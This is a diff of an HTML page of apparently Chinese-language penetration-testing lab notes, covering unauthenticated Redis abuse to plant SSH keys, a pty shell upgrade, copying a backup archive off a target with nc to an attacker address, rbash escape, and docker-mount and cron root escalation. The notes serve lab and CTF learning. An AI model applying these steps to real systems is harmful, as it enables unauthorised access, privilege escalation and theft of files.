@@ -6941,7 +6941,7 @@
 <p>还有很多软件可以具体找一下他们怎么能开一个 shell，sudo 打开就是 root</p>
 <h1 id="redis-未授权访问"><a href="#redis-未授权访问" class="headerlink" title="redis 未授权访问"></a>redis 未授权访问</h1><p>关于 redis 核心利用点是，<strong>通过没有身份校验的 redis 服务进行登陆</strong>，同时<strong>指定 config dir 和 config dbfilename 的路径与名称</strong>，达到<strong>把本地公钥存储到远程服务器</strong>上，这时候在通过 ssh 进行远程登陆。可以<strong>获得名为 redis 的 shell</strong></p>
 <p>有个利用脚本<br><a href="https://github.com/Avinash-acid/Redis-Server-Exploit" target="_blank" rel="noopener">https://github.com/Avinash-acid/Redis-Server-Exploit</a></p>
-<h1 id="python-交互式终端"><a href="#python-交互式终端" class="headerlink" title="python 交互式终端"></a>python 交互式终端</h1><p>一般打开的 shell，只有一个 $ 符号，通过这个能好看一下<br>python -c “import pty;pty.spawn(‘/bin/bash’)”</p>
+<h1 id="python-交互式终端"><a href="#python-交互式终端" class="headerlink" title="python 交互式终端"></a>python 交互式终端</h1><p>一般打开的 shell，只有一个 $ 符号，通过这个能好看一下<br><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
 <h1 id="从靶机上拷出东西来"><a href="#从靶机上拷出东西来" class="headerlink" title="从靶机上拷出东西来"></a>从靶机上拷出东西来</h1><p>(如果有 web 服务的话，直接拷到 web 目录，然后下载应该也可以吧)<br>攻击机新开一个终端，<code>nc -lvp 10001 &gt;backup-ssh-identity-files.tgz</code> 用来接收那个压缩包文件<br>靶机 shell 里面使用 <code>nc 10.10.15.84 10001 &lt; backup-ssh-identity-files.tgz</code></p>
 <h1 id="rbash-逃逸"><a href="#rbash-逃逸" class="headerlink" title="rbash 逃逸"></a>rbash 逃逸</h1><p>rbash 会限制一些命令没法用，参考：<a href="https://xz.aliyun.com/t/7642" target="_blank" rel="noopener">https://xz.aliyun.com/t/7642</a></p>
 <h1 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h1><p>一个命令行下识别 cms 的工具</p>
@@ -6953,6 +6953,7 @@
                 <div class="image-caption"></div>
             </figure>
 
+<h1 id="docker-相关"><a href="#docker-相关" class="headerlink" title="docker 相关"></a>docker 相关</h1><p>挂载目录：加参数 <code>-v /root/:/root/</code><br>在<a href="https://www.yuque.com/hxfqg9/web/fb84x0" target="_blank" rel="noopener">这个靶机</a>中拿到用户权限之后可以对 docker 进行操作，而 docker 进去是 root 权限的，docker 挂载上靶机的 root 目录之后就可以 root 权限对 /root 目录进行操作了</p>
 <h1 id="当你能-root-权限写文件"><a href="#当你能-root-权限写文件" class="headerlink" title="当你能 root 权限写文件"></a>当你能 root 权限写文件</h1><h2 id="写-linux-计划任务"><a href="#写-linux-计划任务" class="headerlink" title="写 linux 计划任务"></a>写 linux 计划任务</h2><p>cron 的默认配置文件是 /etc/cronted，#开头的是注释，不会被处理<br>然后上面的内容是来设置 cron 的运行环境的</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
